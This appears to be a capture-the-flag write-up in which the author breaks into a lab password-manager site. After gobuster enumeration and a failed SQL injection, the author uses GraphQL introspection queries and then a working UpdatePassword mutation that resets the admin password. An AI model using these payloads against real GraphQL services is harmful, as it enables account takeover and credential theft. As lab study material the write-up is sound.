Description: 
Pandora discovered the presence of a mole within the ministry. To proceed with caution, she must obtain the master control password for the ministry, which is stored in a password manager. Can you hack into the password manager?

Accessed webpage at http://165.232.98.69:32274
	
  - website for a password manager
	
  - redirected to login page when accessing website
	
  - tried SQL injection to log in as admin > error: "invalid credentials"
	
  - tried registering new user account as " admin" to re-register existing admin account > created new account only

```
gobuster dir -u http://165.232.98.69:32274 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
```

  - only contains /register and /dashboard directories

Tried creating new user account again while intercepting the requests through BurpSuite
	
  - this is a HTTP POST request to /graphql directory

REF: https://blog.yeswehack.com/yeswerhackers/how-exploit-graphql-endpoint-bug-bounty/

REF: https://korbinian-spielvogel.de/posts/help-writeup/
	
  - GraphQL is a vulnerable API

Sent 2 graphql queries to attempt to find the username and password for this login page

- http://165.232.98.69:32274/graphql?query={__schema{types{name,fields{name}}}}
	
    ○ shows entire graphql schema of all stored data

- http://165.232.98.69:32274/graphql?query={Phrases{username,password}}
		
    ○ returns error: "cannot query field on type 'Query'"
	
    ○ not finding much helpful info on this error message

REF: https://www.youtube.com/watch?v=0wPKzinwM7A&t=2s

  - explains how to query and extract data through GraphQL queries in BurpSuite
	
  - this manipulates the query function with GraphQL to extract data

Created new user account ('test':test) and logged into website

Upon logging into webpage with new account, I launched BurpSuite to start capturing these requests

Attempted to extract the usernames and passwords from "getPhrasesList" object for this website:

```
{
"query":"{ getPhraseList {username,password} }"
}
```

  - this did not return any usernames or passwords
	
  - also attempted same query on "Phrases" > returned same error as above through URL method

The other type of type of request that can be sent to GraphQL is a mutation
	
  - this is used to manipulate data

There is an "UpdatePassword" function created for this webpage
	
  - requires entering a username and password as arguments to update password
	
  - tried creating new payload for this attack:
	
 ```
  {
		"query":
		"mutation($username: String!, $password: String!) { UpdatePassword( username: $username, password: $password) { message } }",
		"variables":{
			"username":"admin",
			"password":"test"
			}
		}
 ```
  
This mutation request worked and successfully updated the admin password

Logged into webpage as admin

RETRIEVED FLAG

